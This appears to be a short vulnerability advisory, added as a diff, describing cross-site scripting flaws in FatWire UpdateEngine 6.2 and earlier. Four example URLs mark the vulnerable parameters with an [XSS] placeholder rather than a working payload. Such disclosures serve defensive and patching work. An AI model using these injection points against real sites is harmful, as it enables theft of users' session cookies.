@@ -1,0 +1,32 @@
+source: http://www.securityfocus.com/bid/16073/info
+
+FatWire UpdateEngine is prone to multiple cross-site scripting vulnerabilities.
+
+An attacker may leverage these issues to have arbitrary script code executed in the browser of an unsuspecting user in the context of the affected site. This may facilitate the theft of cookie-based authentication credentials as well as other attacks.
+
+These issues affect versions 6.2 and prior. 
+
+http://www.example.com/UpdateEngine?FUELAP_OP=FUELOP_NewScreen&PAGE_ID
+=FWS%5FPAGE%5F1399202&FUELAP_SITEDBID=SITE%5F%2D
+66&ACTIVITY_ID=FWS%5FWHITEPAPERS%5F1404733&COUNT
+RY_ID=INTSITE%5F1167494&CAMPAIGN_ID=SFCAMPAIGN%5
+F%2D1&COUNTRYNAME=us&SOURCEPAGE_ID=FWS%5FPAGE%5F1
+415379&FUELAP_TEMPLATENAME=[XSS]
+
+http://www.example.com/UpdateEngine?FUELAP_OP=FUELOP_NewScreen&FUELAP_
+TEMPLATENAME=fws%5FforgotpasswordForm&SOURCEPAGE_
+ID=FWS%5FPAGE%5F1150486&PAGE_ID=FWS%5FPAGE%5F1402
+412&EMAIL=[XSS]&CAMPAIGN_ID=SFCAMPAIGN%5F%2D1&COU
+NTRY_ID=INTSITE%5F1167494&ERROR=error&ACTIVITY_ID
+=FWS%5FWHITEPAPERS%5F1300483&COUNTRYNAME=us&FUELA
+P_SITEDBID=SITE%5F%2D66&
+
+http://www.example.com/UpdateEngine?FUELAP_OP=FUELOP_NewScreen&FUELAP_TE
+MPLATENAME=fws%5FforgotpasswordForm&SOURCEPAGE_ID=
+FWS%5FPAGE%5F1150486&PAGE_ID=FWS%5FPAGE%5F1402412&
+EMAIL=&CAMPAIGN_ID=SFCAMPAIGN%5F%2D1&COUNTRY_ID=IN
+TSITE%5F1167494&ERROR=error&ACTIVITY_ID=FWS%5FWHIT
+EPAPERS%5F1300483&COUNTRYNAME=[XSS]
+
+http://www.example.com/UpdateEngine?FUELAP_OP=FUELOP_NewScreen&FUELAP_TE
+MPLATENAME=[XSS] 
